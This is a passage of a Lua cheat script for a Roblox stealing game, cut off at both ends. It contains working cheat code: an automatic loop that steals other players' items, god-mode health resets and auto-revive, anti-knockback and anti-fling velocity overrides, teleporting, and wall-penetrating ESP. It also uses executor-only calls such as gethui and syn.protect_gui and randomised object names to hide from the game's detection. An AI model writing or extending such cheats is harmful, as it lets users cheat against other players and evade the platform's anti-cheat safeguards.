                    end
                end
            end
        end
    end
    A.animals = newCache
    return #newCache
end

function _yv2PickClosest()
    local A = _G.ViperV2Steal
    local root = _yv2Root()
    if not root then return nil end
    local best, bestDist = nil, math.huge
    for _, data in ipairs(A.animals) do
        if not _yv2IsMyBase(data) then
            local pos = _yv2AnimalPos(data)
            local dist = pos and (root.Position - pos).Magnitude or math.huge
            if dist <= (A.primeRange or 80) and dist < bestDist then
                best, bestDist = data, dist
            end
        end
    end
    return best
end

function _yv2EnsureScanThread()
    local A = _G.ViperV2Steal
    if A.scanThread then return end
    A.scanThread = task.spawn(function()
        while _G.ViperV2Steal do
            if A.enabled or selectedStealMode == "V2" then pcall(_yv2ScanAllPlots) end
            task.wait(5)
        end
    end)
end

function stopAutoStealV2()
    local A = _G.ViperV2Steal
    A.enabled = false
    if A.conn then A.conn:Disconnect() A.conn = nil end
    A.state.active = false
    A.state.phase = "idle"
    _yv2ResetBar()
end

function startAutoStealV2()
    local A = _G.ViperV2Steal
    A.radius = 10
    A.enabled = true
    pcall(_yv2EnsureSync)
    _yv2EnsureScanThread()
    pcall(_yv2ScanAllPlots)
    if A.conn then A.conn:Disconnect() A.conn = nil end
    A.conn = RunService.Heartbeat:Connect(function()
        if not A.enabled or not CONFIG.AUTO_STEAL_ENABLED or selectedStealMode ~= "V2" or A.state.active then return end
        local target = _yv2PickClosest()
        if not target then
            if _tick() - (A.lastScan or 0) > 1.2 then
                A.lastScan = _tick()
                pcall(_yv2ScanAllPlots)
            end
            return
        end
        local prompt = _yv2FindPrompt(target)
        if prompt then _yv2Execute(prompt, target) end
    end)
end

function _startAutoStealV1()
    if stealConnection then
        local connected = false
        pcall(function() connected = stealConnection.Connected == true end)
        if connected then
            Steal.StealRadius = CONFIG.STEAL_RANGE
            Steal.AutoStealEnabled = true
            return true
        end
        pcall(function() stealConnection:Disconnect() end)
        stealConnection = nil
    end
    Steal.StealRadius = CONFIG.STEAL_RANGE
    Steal.AutoStealEnabled = true
    stealConnection = RunService.Heartbeat:Connect(function()
        if not Steal.AutoStealEnabled or isStealing then return end
        if selectedStealMode ~= "V1" then return end
        local p, n = findNearestPrompt()
        if p then executeSteal(p, n) end
    end)
    return true
end

function _stopAutoStealV1()
    if stealConnection then
        stealConnection:Disconnect()
        stealConnection = nil
    end
    isStealing = false
    Steal.AutoStealEnabled = false
    if progressFill then
        TS:Create(progressFill, TweenInfo.new(0.2), { Size = UDim2.new(0, 0, 1, 0) }):Play()
    end
    if progressPct then progressPct.Text = "0%" end
end

function startAutoSteal()
    _stopAutoStealV1()
    stopAutoStealV2()
    CONFIG.AUTO_STEAL_ENABLED = true
    if selectedStealMode == "V2" then
        startAutoStealV2()
    else
        _startAutoStealV1()
    end
    return true
end

function stopAutoSteal()
    _stopAutoStealV1()
    stopAutoStealV2()
    CONFIG.AUTO_STEAL_ENABLED = false
    if progressFill then
        TS:Create(progressFill, TweenInfo.new(0.2), { Size = UDim2.new(0, 0, 1, 0) }):Play()
    end
    if progressPct then progressPct.Text = "0%" end
end

medusaDebounce = false
medusaLastUsed = 0
dropActive = false
lastDropTime = 0
lastMoveDir = _V3new(0,0,0)
origFOV = nil
fovEnabled = false
fovValue = 70
customFovConn = nil

_anyKeyListening = false
_aimbotConn = nil
_prevAutoRotate = nil
tpBatConn = nil
tpBatPrevAutoRotate = nil
tpBatHitCD = false
TP_BAT_SWING_CD = 0.08

enemySpeedConn = nil
movementLoop = nil
steppedConn = nil
alConn = nil
arConn = nil
infJumpConn = nil
stretchConn = nil
stretchFovConn = nil
antiLagDescConn = nil
medusaResetConns = {}
dropConnections = {}
enemySpeedLabels = {}
Conns = {autoSteal = nil, batCounter = nil, anchor = {}, progress = nil, autoLeft = nil, autoRight = nil}
keyButtonRefs = {}
progressFill = nil
progressPct = nil
pbFrame = nil
speedLabel = nil
modeValLbl = nil
normalBox, carryBox, laggerBox, lagger2Box, radInput, batSpeedBox, uiScaleBox = nil, nil, nil, nil, nil, nil, nil
normAimBox, lagAimBox, desAimBox, desBox, desStealBox = nil, nil, nil, nil, nil
normalTopBox, stealTopBox = nil, nil
modeSelectBtn, dropModeBtnRef, aimbotModeBtnRef = nil, nil, nil
autoBatSetVisual, autoLeftSetVisual, autoRightSetVisual, setBatCounterVisual, setMedusaVisual = nil, nil, nil, nil, nil
setShowMobileButtonsVisual, setLockMobileButtonsVisual, setAntiRagVisual, setUnwalkVisual, setAntiLagVisual, setLockUIVisual, setInstaGrab = nil, nil, nil, nil, nil, nil, nil
setAntiDieVisual = nil
setAntiBatVisual = nil
setAntiFlingVisual = nil
setESPVIsual = nil
setESPLineVisual = nil
mobSetAutoBat, mobSetAutoLeft, mobSetAutoRight, mobSetDropBR, mobSetTpDown, mobSetCarry, mobSetLagger1, mobSetLagger2, mobSetDesyncSpd = nil, nil, nil, nil, nil, nil, nil, nil, nil
miniBtn, main, gui = nil, nil, nil
MobilePanel = nil
showGui = nil
hideGui = nil
mainUIScale = nil
animSelectorLabel = nil
pbScale = nil
scaleSliderSetters = {}
refreshAutoGrabUISelector = nil
tabButtons = nil
colorSelectorLabel = nil

GAMEPAD_KEYS = {
    [Enum.KeyCode.ButtonA] = true, [Enum.KeyCode.ButtonB] = true,
    [Enum.KeyCode.ButtonX] = true, [Enum.KeyCode.ButtonY] = true,
    [Enum.KeyCode.ButtonL1] = true, [Enum.KeyCode.ButtonR1] = true,
    [Enum.KeyCode.ButtonL2] = true, [Enum.KeyCode.ButtonR2] = true,
    [Enum.KeyCode.ButtonL3] = true, [Enum.KeyCode.ButtonR3] = true,
    [Enum.KeyCode.ButtonStart] = true, [Enum.KeyCode.ButtonSelect] = true,
    [Enum.KeyCode.DPadUp] = true, [Enum.KeyCode.DPadDown] = true,
    [Enum.KeyCode.DPadLeft] = true, [Enum.KeyCode.DPadRight] = true,
}

MOVE_KEYS = {
    [Enum.KeyCode.W] = true, [Enum.KeyCode.A] = true,
    [Enum.KeyCode.S] = true, [Enum.KeyCode.D] = true,
    [Enum.KeyCode.Up] = true, [Enum.KeyCode.Left] = true,
    [Enum.KeyCode.Down] = true, [Enum.KeyCode.Right] = true,
}

BAT_COUNTER_SLAP_LIST = {
    "Bat", "Slap", "Iron Slap", "Gold Slap", "Diamond Slap",
    "Emerald Slap", "Ruby Slap", "Dark Matter Slap", "Flame Slap",
    "Nuclear Slap", "Galaxy Slap", "Glitched Slap"
}

AP = {
    L1 = _V3new(-476.48, -6.28, 92.73),
    L2 = _V3new(-483.12, -4.95, 94.80),
    L_FACE = _V3new(-482.25, -4.96, 92.09),
    R1 = _V3new(-476.16, -6.52, 25.62),
    R2 = _V3new(-483.06, -5.03, 25.48),
    R_FACE = _V3new(-482.06, -6.93, 35.47),
}

function isGamepadInput(inp)
    return inp and inp.UserInputType and inp.UserInputType.Name:match("^Gamepad") ~= nil
end

function isBindableInput(inp)
    if not inp or inp.KeyCode == Enum.KeyCode.Unknown then return false end
    if inp.UserInputType == Enum.UserInputType.Keyboard then return true end
    return isGamepadInput(inp) and GAMEPAD_KEYS[inp.KeyCode] == true
end

function kbMatch(entry, kc)
    return kc and (kc == entry.kb or (entry.gp and kc == entry.gp))
end

function resetProgressBar()
    if progressPct then progressPct.Text = "0%" end
    if progressFill then progressFill.Size = UDim2.new(0, 0, 1, 0) end
end

-- =====================================================================
-- TP DOWN
-- =====================================================================
TP_DOWN_OFFSET = 0.1
_G._VynxTPDownMode = (_G._VynxTPDownMode == "half") and "half" or "full"
if _G._VynxAutoTPDownEnabled == nil then _G._VynxAutoTPDownEnabled = false end
_G._VynxAutoTPDownHeightTrigger = tonumber(_G._VynxAutoTPDownHeightTrigger) or 20

function _tpIsCarryingBrainrot(char)
    if not char then return false end
    if LP:GetAttribute("Stealing") == true or char:GetAttribute("Stealing") == true then
        return true
    end
    for _, child in ipairs(char:GetChildren()) do
        if child:IsA("Tool") then
            local n = child.Name:lower()
            if not (n:find("bat") or n:find("slap") or n:find("medusa")) then return true end
        end
    end
    return false
end

function _runTPDownHalf()
    pcall(function()
        local c = LP.Character
        if not c then return end
        local hrp = c:FindFirstChild("HumanoidRootPart")
        if not hrp then return end
        local hum = c:FindFirstChildOfClass("Humanoid")
        if not hum then return end
        local rp = _RayParams_new()
        rp.FilterDescendantsInstances = {c}
        rp.FilterType = Enum.RaycastFilterType.Exclude
        local hit = workspace:Raycast(hrp.Position, _V3new(0, -500, 0), rp)
        if hit then
            hrp.AssemblyLinearVelocity = _V3zero
            hrp.AssemblyAngularVelocity = _V3zero
            local hh = hum.HipHeight or 2
            local hy = hrp.Size.Y / 2
            hrp.CFrame = _CFnew(hit.Position.X, hit.Position.Y + hh + hy + (TP_DOWN_OFFSET or 0.1), hit.Position.Z)
            hrp.AssemblyLinearVelocity = _V3zero
        end
    end)
end

function _runTPDownFull()
    pcall(function()
        local c = LP.Character
        if not c then return end
        local hrp = c:FindFirstChild("HumanoidRootPart")
        if not hrp then return end
        local _, yaw = hrp.CFrame:ToEulerAnglesYXZ()
        hrp.CFrame = _CFnew(hrp.Position.X, -7.00, hrp.Position.Z) * CFrame.Angles(0, yaw, 0)
        hrp.AssemblyLinearVelocity = _V3zero
    end)
end

-- Smooth TP Down (0.05s ease-out)
function _smoothTpDown()
    local char = LP.Character
    if not char then return end
    local root = char:FindFirstChild("HumanoidRootPart")
    if not root then return end
    local hum = char:FindFirstChildOfClass("Humanoid")
    if not hum or hum.Health <= 0 or root.Anchored or hum.Sit or hum.SeatPart then return end
    
    local ignoreList = {char}
    for _, p in ipairs(Players:GetPlayers()) do
        if p ~= LP and p.Character then
            table.insert(ignoreList, p.Character)
        end
    end
    
    local rp = _RayParams_new()
    rp.FilterDescendantsInstances = ignoreList
    rp.FilterType = Enum.RaycastFilterType.Exclude
    local rr = workspace:Raycast(root.Position, _V3new(0, -2000, 0), rp)
    if not rr then return end
    
    local off = (hum.HipHeight or 2) + (root.Size.Y / 2)
    local targetY = rr.Position.Y + off + (TP_DOWN_OFFSET or 0.1)
    
    root.CFrame = _CFnew(root.Position.X, targetY, root.Position.Z)
    local vel = root.AssemblyLinearVelocity
    root.AssemblyLinearVelocity = _V3new(vel.X, 0, vel.Z)
    root.AssemblyAngularVelocity = _V3zero
end

function executeTPDown()
    if dropActive or _G.IsDropping then return end
    _smoothTpDown()
end

function doTpDown()
    executeTPDown()
end

local _tpAutoConn = RunService.Heartbeat:Connect(function()
    if _G._VynxAutoTPDownEnabled ~= true then return end
    local char = LP.Character
    if not char then return end
    if not _tpIsCarryingBrainrot(char) then return end
    local root = char:FindFirstChild("HumanoidRootPart")
    if not root then return end
    local rp = _RayParams_new()
    rp.FilterDescendantsInstances = {char}
    rp.FilterType = Enum.RaycastFilterType.Exclude
    local hit = workspace:Raycast(root.Position, _V3new(0, -2000, 0), rp)
    if not hit then return end
    local trigger = tonumber(_G._VynxAutoTPDownHeightTrigger) or 20
    if root.Position.Y - hit.Position.Y > trigger then
        executeTPDown()
    end
end)

_G._VynxRunTPDown = executeTPDown
_G._VynxSetTPDownMode = function(m)
    _G._VynxTPDownMode = (m == "half") and "half" or "full"
    return _G._VynxTPDownMode
end
_G._VynxTPDownIsAutoOn = function() return _G._VynxAutoTPDownEnabled == true end

-- TP Down is triggered via InputBegan keybind handler (KB.TPFloor) -- no hold loop needed

-- =====================================================================
-- ANTI RAGDOLL
-- =====================================================================
local AntiRagdollV2 = {
    Enabled = false,
    Connection = nil,
    ResetCooldown = 0,
}

function startAntiRagdollV2()
    if AntiRagdollV2.Connection then return end
    AntiRagdollV2.Enabled = true
    AntiRagdollV2.Connection = RunService.Heartbeat:Connect(function()
        if not AntiRagdollV2.Enabled then return end
        local char = LP.Character
        if not char then return end
        local hum = char:FindFirstChildOfClass("Humanoid")
        local root = char:FindFirstChild("HumanoidRootPart")
        if not hum or not root or hum.Health <= 0 then return end
        if dropActive or _G.IsDropping then return end
        local state = hum:GetState()
        local now = _tick()
        if state == Enum.HumanoidStateType.Physics or
           state == Enum.HumanoidStateType.Ragdoll or
           state == Enum.HumanoidStateType.FallingDown then
            if now - AntiRagdollV2.ResetCooldown > 0.15 then
                AntiRagdollV2.ResetCooldown = now
                pcall(function()
                    hum:ChangeState(Enum.HumanoidStateType.GettingUp)
                    root.Velocity = _V3zero
                    root.RotVelocity = _V3zero
                    root.AssemblyLinearVelocity = _V3zero
                    root.AssemblyAngularVelocity = _V3zero
                    for _, obj in ipairs(char:GetDescendants()) do
                        if obj:IsA("Motor6D") then obj.Enabled = true end
                        if obj:IsA("Constraint") then obj.Enabled = true end
                    end
                    workspace.CurrentCamera.CameraSubject = hum
                    local PM = LP.PlayerScripts:FindFirstChild("PlayerModule")
                    if PM then
                        local CM = require(PM:FindFirstChild("ControlModule"))
                        if CM then CM:Enable() end
                    end
                    hum.AutoRotate = true
                    hum.PlatformStand = false
                    hum.Sit = false
                end)
            end
        end
    end)
end

function stopAntiRagdollV2()
    AntiRagdollV2.Enabled = false
    if AntiRagdollV2.Connection then
        AntiRagdollV2.Connection:Disconnect()
        AntiRagdollV2.Connection = nil
    end
    AntiRagdollV2.ResetCooldown = 0
end

LP.CharacterAdded:Connect(function()
    task.wait(0.5)
    if antiRagdollMode == "v2" then
        if AntiRagdollV2.Connection then
            AntiRagdollV2.Connection:Disconnect()
            AntiRagdollV2.Connection = nil
        end
        startAntiRagdollV2()
    end
end)

function setAntiRagdollMode(mode)
    if mode == "v2" then
        startAntiRagdollV2()
        antiRagdollMode = "v2"
    else
        stopAntiRagdollV2()
        antiRagdollMode = "off"
    end
    if setAntiRagVisual then setAntiRagVisual(antiRagdollMode == "v2") end
    saveAllSettings()
end

-- =====================================================================
-- [FIX ANTI DIE VIOLETTE v2]
-- =====================================================================
_antiDieEnabled = false
_antiDieStopped = false
_antiDieSources = { toggle = false, autobat = false }

_antiDie = {
    enabled = false, loop = nil, healthConn = nil, charConn = nil,
    lastHealTime = 0, invincibleUntil = 0,
    config = {
        healthThreshold = 50,
        invincibilityFrames = 0.75,
        fallDamageProtection = false,
        ragdollProtection = true,
        autoRevive = true,
    },
}

function _antiDie.SuperHeal(hum)
    if not hum or not hum.Parent then return end
    local maxHealth = hum.MaxHealth or 100
    if maxHealth <= 0 or maxHealth == math.huge then maxHealth = 100 end
    pcall(function()
        hum.Health = maxHealth
        if hum.MaxHealth < maxHealth then hum.MaxHealth = maxHealth end
    end)
    _antiDie.invincibleUntil = _tick() + _antiDie.config.invincibilityFrames
    _antiDie.lastHealTime = _tick()
    pcall(function()
        local char = hum.Parent
        if not char then return end
        for _, child in ipairs(char:GetChildren()) do
            if child:IsA("NumberValue") then
                local name = child.Name:lower()
                if name:find("health") or name:find("hp") or name:find("life") then
                    child.Value = maxHealth
                end
            end
            if child:IsA("BoolValue") and child.Name:lower():find("dead") then
                child.Value = false
            end
        end
    end)
end

function _antiDie.PreventDamage(root, hum)
    if not hum then return end
    if hum.Health < (hum.MaxHealth or 100) then _antiDie.SuperHeal(hum) end
    if _tick() < _antiDie.invincibleUntil then
        if hum.Health < (hum.MaxHealth or 100) then
            hum.Health = hum.MaxHealth or 100
        end
    end
    if _antiDie.config.ragdollProtection then
        local state = hum:GetState()
        if state == Enum.HumanoidStateType.Physics or
           state == Enum.HumanoidStateType.Ragdoll or
           state == Enum.HumanoidStateType.FallingDown or
           state == Enum.HumanoidStateType.Dead then
            pcall(function()
                hum:ChangeState(Enum.HumanoidStateType.GettingUp)
                hum:ChangeState(Enum.HumanoidStateType.Running)
            end)
            _antiDie.SuperHeal(hum)
            if root then
                pcall(function() root.AssemblyAngularVelocity = Vector3.zero end)
            end
        end
    end
    if hum.Health <= 0 then
        _antiDie.SuperHeal(hum)
        pcall(function()
            hum:ChangeState(Enum.HumanoidStateType.GettingUp)
            hum:ChangeState(Enum.HumanoidStateType.Running)
        end)
        if root then
            pcall(function()
                root.CFrame = CFrame.new(root.Position + Vector3.new(0, 2, 0))
                root.AssemblyLinearVelocity = Vector3.zero
            end)
        end
    end
end

function _antiDie.AutoRevive()
    if not _antiDie.config.autoRevive then return end
    local char = LP.Character
    if not char then return end
    local hum = char:FindFirstChildOfClass("Humanoid")
    local root = char:FindFirstChild("HumanoidRootPart")
    if not hum then return end
    if hum.Health <= 0 then
        _antiDie.SuperHeal(hum)
        pcall(function()
            hum:ChangeState(Enum.HumanoidStateType.GettingUp)
            hum:ChangeState(Enum.HumanoidStateType.Running)
        end)
        if root then
            pcall(function()
                root.CFrame = CFrame.new(root.Position + Vector3.new(0, 3, 0))
                root.AssemblyLinearVelocity = Vector3.zero
            end)
        end
    end
end

function _antiDie.AttachHealth(char)
    if _antiDie.healthConn then _antiDie.healthConn:Disconnect(); _antiDie.healthConn = nil end
    local hum = char and char:FindFirstChildOfClass("Humanoid")
    if not hum then hum = char and char:WaitForChild("Humanoid", 3) end
    if not hum then return end
    _antiDie.healthConn = hum:GetPropertyChangedSignal("Health"):Connect(function()
        if not _antiDie.enabled then return end
        if hum.Health < (hum.MaxHealth or 100) then _antiDie.SuperHeal(hum) end
        if hum.Health <= 0 then _antiDie.AutoRevive() end
    end)
    if hum.Health < (hum.MaxHealth or 100) then _antiDie.SuperHeal(hum) end
end

function _antiDie.StartEngine()
    if _antiDie.enabled and _antiDie.loop then return end
    _antiDie.enabled = true
    _antiDieEnabled = true
    antiDieEnabled = true
    if _antiDie.loop then _antiDie.loop:Disconnect(); _antiDie.loop = nil end
    if _antiDie.healthConn then _antiDie.healthConn:Disconnect(); _antiDie.healthConn = nil end
    _antiDie.loop = RunService.Heartbeat:Connect(function()
        if not _antiDie.enabled then return end
        local char = LP.Character
        if not char then return end
        local hum = char:FindFirstChildOfClass("Humanoid")
        local root = char:FindFirstChild("HumanoidRootPart")
        if not hum then return end
        if hum.Health <= 0 then _antiDie.AutoRevive()
        elseif hum.Health <= _antiDie.config.healthThreshold then _antiDie.SuperHeal(hum)
        elseif hum.Health < (hum.MaxHealth or 100) then _antiDie.SuperHeal(hum) end
        _antiDie.PreventDamage(root, hum)
    end)
    if LP.Character then _antiDie.AttachHealth(LP.Character) end
    if _antiDie.charConn then _antiDie.charConn:Disconnect(); _antiDie.charConn = nil end
    _antiDie.charConn = LP.CharacterAdded:Connect(function(char)
        if not _antiDie.enabled then return end
        task.wait(0.05)
        _antiDie.AttachHealth(char)
        local hum = char:FindFirstChildOfClass("Humanoid")
        if hum then _antiDie.SuperHeal(hum) end
    end)
end

function _antiDie.StopEngine()
    _antiDie.enabled = false
    _antiDieEnabled = false
    antiDieEnabled = false
    if _antiDie.loop then _antiDie.loop:Disconnect(); _antiDie.loop = nil end
    if _antiDie.healthConn then _antiDie.healthConn:Disconnect(); _antiDie.healthConn = nil end
    if _antiDie.charConn then _antiDie.charConn:Disconnect(); _antiDie.charConn = nil end
    pcall(function()
        local char = LP.Character
        local hum = char and char:FindFirstChildOfClass("Humanoid")
        if not hum then return end
        hum:SetStateEnabled(Enum.HumanoidStateType.Dead, true)
        hum:SetStateEnabled(Enum.HumanoidStateType.Ragdoll, true)
        hum:SetStateEnabled(Enum.HumanoidStateType.FallingDown, true)
        hum.BreakJointsOnDeath = true
        if hum.MaxHealth == math.huge or hum.MaxHealth <= 0 then
            hum.MaxHealth = 100
            hum.Health = math.min(hum.Health, 100)
        end
    end)
end

function _antiDieSetEnabled(enabled)
    enabled = enabled == true
    if enabled == _antiDieEnabled then return end
    if enabled then
        _antiDie.StartEngine()
    else
        _antiDie.StopEngine()
    end
end

function _antiDieRefresh()
    if _antiDieStopped then return end
    local manual = _antiDieSources.toggle
    _antiDieSetEnabled(manual or _antiDieSources.autobat)
end

_G.__CrystalAntiDieSource = function(source, enabled)
    if _antiDieStopped or _antiDieSources[source] == nil then return end
    _antiDieSources[source] = enabled == true
    _antiDieRefresh()
end

_G.__CrystalAntiDieSet = function(enabled)
    _G.__CrystalAntiDieSource("autobat", enabled)
end

_G.__CrystalAntiDieIsEnabled = function() return _antiDieEnabled end
_G.__CrystalAntiDieStop = function()
    _antiDieStopped = true
    _antiDieSources.toggle = false
    _antiDieSources.autobat = false
    _antiDieSetEnabled(false)
end

function activateOnCharacter(char)
    if not _antiDieEnabled then return end
    _antiDie.AttachHealth(char)
    local hum = char and char:FindFirstChildOfClass("Humanoid")
    if hum then _antiDie.SuperHeal(hum) end
end

AntiDieModule = {
    enabled = false,
    start = function()
        AntiDieModule.enabled = true
        antiDieEnabled = true
        _antiDieStopped = false
        _G.__CrystalAntiDieSource("toggle", true)
    end,
    stop = function()
        AntiDieModule.enabled = false
        antiDieEnabled = false
        _G.__CrystalAntiDieSource("toggle", false)
    end,
}
_G.AntiDie = AntiDieModule

-- =====================================================================
-- ANTI BAT (lógica portada desde Violette)
-- Reemplaza la versión previa de Viper que usaba root.Velocity y que
-- también recuperaba del ragdoll. Ahora sólo aplica el pulso de
-- AssemblyLinearVelocity (500, y, 500) y espera un RenderStepped para
-- restaurar el componente horizontal. La recuperación de ragdoll queda
-- exclusivamente a cargo del toggle "Anti Ragdoll".
-- =====================================================================
local AntiBat = { Connection = nil }

function stopAntiBat()
    antiBatEnabled = false
    if AntiBat.Connection then
        AntiBat.Connection:Disconnect()
        AntiBat.Connection = nil
    end
end

function startAntiBat()
    stopAntiBat()
    antiBatEnabled = true

    local char = LP.Character
    if not char then return end
    local root = char:FindFirstChild("HumanoidRootPart")
    if not root then return end

    AntiBat.Connection = RunService.Heartbeat:Connect(function()
        if not antiBatEnabled then return end

        if not root or not root.Parent then
            root = LP.Character and LP.Character:FindFirstChild("HumanoidRootPart")
            if not root then return end
        end

        local vel  = root.AssemblyLinearVelocity
        local flat = Vector3.new(vel.X, 0, vel.Z)

        root.AssemblyLinearVelocity = Vector3.new(500, vel.Y, 500)
        RunService.RenderStepped:Wait()
        if root and root.Parent then
            local y2 = root.AssemblyLinearVelocity.Y
            root.AssemblyLinearVelocity = Vector3.new(flat.X, y2, flat.Z)
        end
    end)
end

LP.CharacterAdded:Connect(function()
    task.wait(0.3)
    if antiBatEnabled then startAntiBat() end
end)

-- =====================================================================
-- ANTI FLING (lógica portada desde Violette)
-- Cancela velocidades horizontales anómalas (>80 studs/s) y rotaciones
-- extremas (>40 rad/s) que no provienen del propio hub.
-- Ignora: drop activo, aimbots/paths activos, y velocidad propia reciente.
-- =====================================================================
setAntiFlingVisual = nil

local _antiFlingState = {
    connection    = nil,
    threshold     = 80,
    spinThreshold = 40,
}
local _ANTI_FLING_DRIVE_GRACE = 0.3

function _afHubSpeedLive()
    local live = _G.__ViperLiveSpeed
    if type(live) ~= "table" then return false end
    local stamp, speed = tonumber(live.t), tonumber(live.v)
    if not stamp or not speed or speed <= 0 then return false end
    return (os.clock() - stamp) <= _ANTI_FLING_DRIVE_GRACE
end

function _afOwnMoverActive()
    -- Si estamos usando TPBat/Desync, el CFrame salta y no queremos cancelar
    if batDesyncTpEnabled then return true end
    -- Aimbot y auto-path usan velocidades que podrían confundirse con fling
    if autoBatEnabled or bypassAimbotEnabled then return true end
    if autoLeftEnabled or autoRightEnabled then return true end
    return false
end

function startAntiFling()
    if _antiFlingState.connection then return end
    antiFlingEnabled = true
    _antiFlingState.connection = RunService.Heartbeat:Connect(function()
        if not antiFlingEnabled then return end
        local character = LP.Character
        if not character then return end
        local root = character:FindFirstChild("HumanoidRootPart")
        if not root then return end
        local humanoid = character:FindFirstChildOfClass("Humanoid")
        if humanoid and (humanoid.Health <= 0 or humanoid.SeatPart) then return end

        -- Guardas: no pisar nuestras propias acciones
        if dropActive or _G.IsDropping then return end
        if _afOwnMoverActive() then return end
        if _afHubSpeedLive() then return end

        local velocity = root.AssemblyLinearVelocity
        local flat = Vector3.new(velocity.X, 0, velocity.Z)

        if flat.Magnitude > _antiFlingState.threshold then
            pcall(function()
                root.AssemblyLinearVelocity = Vector3.new(0, velocity.Y, 0)
                root.AssemblyAngularVelocity = Vector3.zero
            end)
            return
        end
        if root.AssemblyAngularVelocity.Magnitude > _antiFlingState.spinThreshold then
            pcall(function() root.AssemblyAngularVelocity = Vector3.zero end)
        end
    end)
end

function stopAntiFling()
    antiFlingEnabled = false
    if _antiFlingState.connection then
        _antiFlingState.connection:Disconnect()
        _antiFlingState.connection = nil
    end
end

LP.CharacterAdded:Connect(function()
    task.wait(0.3)
    if antiFlingEnabled then startAntiFling() end
end)

-- =====================================================================
-- ESP
-- =====================================================================
local espEnabled = espEnabled or false
local espActivePlayers = {}
local espLoopConn = nil
local Camera = workspace.CurrentCamera
local GUI2_ESP_COLOR = Color3.fromRGB(139, 72, 246)
local GUI2_ESP_TEXT_STROKE = Color3.fromRGB(48, 16, 92)

function getESPThemeColors(accent)
    local c = getThemeColor() or accent or Color3.fromRGB(245, 245, 250)
    return c, c
end

local function safeProtectGui(obj)
    if not obj then return end
    pcall(function()
        if type(protectgui) == "function" then
            protectgui(obj)
        elseif type(protect_gui) == "function" then
            protect_gui(obj)
        elseif type(syn) == "table" and type(syn.protect_gui) == "function" then
            syn.protect_gui(obj)
        end
    end)
end

local function getSafeESPFolder()
    local target = nil
    if type(gethui) == "function" then
        local okH, h = pcall(gethui)
        if okH and h then target = h end
    end
    if not target then
        local okCg, cg = pcall(function() return game:GetService("CoreGui") end)
        if okCg and cg then target = cg end
    end
    if not target then
        target = workspace.CurrentCamera
    end
    return target
end

local function getSafeGuiParent()
    local p = nil
    if type(gethui) == "function" then
        local okH, h = pcall(gethui)
        if okH and h then p = h end
    end
    if not p then
        local okCg, cg = pcall(function() return game:GetService("CoreGui") end)
        if okCg and cg then p = cg end
    end
    if not p then
        p = LP:FindFirstChildOfClass("PlayerGui")
    end
    return p
end

function createESP()
    local currentFill, currentLine = getESPThemeColors()
    local esp = {
        Tracer = Drawing and Drawing.new("Line") or nil,
        Highlight = Instance.new("Highlight"),
        Lines = {},
    }
    if esp.Tracer then
        esp.Tracer.Color = currentLine
        esp.Tracer.Thickness = 3
        esp.Tracer.Transparency = 1
        esp.Tracer.ZIndex = 2
    end

    local randTag = "ESP_" .. tostring(math.random(100000, 999999))
    esp.Highlight.Name = randTag
    esp.Highlight.FillColor = currentFill
    esp.Highlight.OutlineColor = getThemeColor()
    esp.Highlight.FillTransparency = 0.78
    esp.Highlight.OutlineTransparency = 0
    esp.Highlight.DepthMode = Enum.HighlightDepthMode.AlwaysOnTop
    safeProtectGui(esp.Highlight)
    pcall(function() esp.Highlight.Parent = getSafeESPFolder() end)

    local nameBillboard = Instance.new("BillboardGui")
    nameBillboard.Name = "BB_" .. tostring(math.random(100000, 999999))
    nameBillboard.Size = UDim2.new(0, 108, 0, 20)
    nameBillboard.StudsOffset = Vector3.new(0, 2.0, 0)
    nameBillboard.AlwaysOnTop = true
    nameBillboard.ResetOnSpawn = false
    nameBillboard.MaxDistance = 5000
    safeProtectGui(nameBillboard)
    pcall(function() nameBillboard.Parent = getSafeGuiParent() end)

    local nameLabel = Instance.new("TextLabel")
    nameLabel.Size = UDim2.new(1, 0, 1, 0)
    nameLabel.AnchorPoint = Vector2.new(0.5, 0)
    nameLabel.Position = UDim2.new(0.5, 0, 0, 2)
    nameLabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
    nameLabel.BackgroundTransparency = 1
    nameLabel.Text = ""
    nameLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
    nameLabel.TextSize = 11
    nameLabel.Font = Enum.Font.GothamBold
    nameLabel.TextStrokeColor3 = Color3.fromRGB(255, 255, 255)
    nameLabel.TextStrokeTransparency = 1
    nameLabel.TextXAlignment = Enum.TextXAlignment.Center
    nameLabel.TextYAlignment = Enum.TextYAlignment.Center
    nameLabel.ZIndex = 5
    nameLabel.Parent = nameBillboard

    local nameOutline = Instance.new("UIStroke")
    nameOutline.Color = Color3.fromRGB(25, 25, 25)
    nameOutline.Thickness = 1
    nameOutline.Transparency = 0.15
    nameOutline.Parent = nameLabel
    local nameCorner = Instance.new("UICorner")
    nameCorner.CornerRadius = UDim.new(0, 4)
    nameCorner.Parent = nameLabel

    if Drawing then
        for i = 1, 14 do
            local line = Drawing.new("Line")
            line.Color = currentLine
            line.Thickness = 2
            line.Transparency = 1
            line.ZIndex = 3
            table.insert(esp.Lines, line)
        end
    end

    esp.NameTag = nameBillboard
    esp.NameLabel = nameLabel
    esp.NameOutline = nameOutline
    return esp
end

_G.__ViperRefreshESPTheme = function(accent, outlineColor)
    local fillColor, lineColor = getESPThemeColors(accent)
    for _, data in pairs(espActivePlayers) do
        if type(data) == "table" and data.esp then
            local esp = data.esp
            if esp.Tracer then pcall(function() esp.Tracer.Color = lineColor end) end
            if esp.Highlight then
                esp.Highlight.FillColor = fillColor
                esp.Highlight.OutlineColor = getThemeColor()
            end
            if esp.NameLabel then
                esp.NameLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
                esp.NameLabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
                esp.NameLabel.BackgroundTransparency = 1
                esp.NameLabel.TextStrokeColor3 = Color3.fromRGB(0, 0, 0)
            end
            if esp.NameOutline then esp.NameOutline.Color = Color3.fromRGB(35, 35, 35) end
            for _, line in ipairs(esp.Lines or {}) do pcall(function() line.Color = lineColor end) end
        end
    end
end

function removeESP(plr)
    local data = espActivePlayers[plr]
    if data then
        if data.esp.Tracer then pcall(function() data.esp.Tracer:Remove() end) end
        if data.esp.Highlight then pcall(function() data.esp.Highlight:Destroy() end) end
        if data.esp.NameTag then pcall(function() data.esp.NameTag:Destroy() end) end
        for _, line in ipairs(data.esp.Lines) do
            pcall(function() line:Remove() end)
        end
        espActivePlayers[plr] = nil
    end
end

function updateESP(plr, esp)
    if not espEnabled then
        if esp.Tracer then esp.Tracer.Visible = false end
        if esp.Highlight then pcall(function() esp.Highlight.Enabled = false end) end
        for _, line in ipairs(esp.Lines or {}) do line.Visible = false end
